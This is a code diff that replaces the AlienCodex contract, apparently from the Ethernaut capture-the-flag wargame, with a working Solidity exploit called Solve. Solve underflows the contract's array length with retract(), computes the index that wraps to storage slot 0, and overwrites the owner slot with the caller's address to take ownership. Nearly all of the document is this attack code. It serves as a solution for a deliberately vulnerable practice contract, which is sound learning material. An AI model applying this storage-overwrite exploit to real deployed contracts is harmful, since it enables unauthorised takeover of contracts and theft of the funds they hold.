@@ -1,31 +1,26 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.5.0;
+pragma solidity ^0.8.0;
 
-import '../helpers/Ownable-05.sol';
+interface IAlienCodex {
+    function revise(uint256 i, bytes32 _content) external;
+    function owner() external view returns (address);
+    function codex(uint256) external view returns (bytes32);
+    function retract() external;
+    function makeContact() external;
+}
 
-contract AlienCodex is Ownable {
+contract Solve {
+    constructor(IAlienCodex target) {
+        target.makeContact();
+        target.retract();
 
-  bool public contact;
-  bytes32[] public codex;
+        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
+        uint256 i;
+        unchecked {
+            i -= h;
+        }
 
-  modifier contacted() {
-    assert(contact);
-    _;
-  }
-  
-  function makeContact() public {
-    contact = true;
-  }
-
-  function record(bytes32 _content) contacted public {
-    codex.push(_content);
-  }
-
-  function retract() contacted public {
-    codex.length--;
-  }
-
-  function revise(uint i, bytes32 _content) contacted public {
-    codex[i] = _content;
-  }
+        target.revise(i, bytes32(uint256(uint160(msg.sender))));
+        require(target.owner() == msg.sender, "hack failed");
+    }
 }
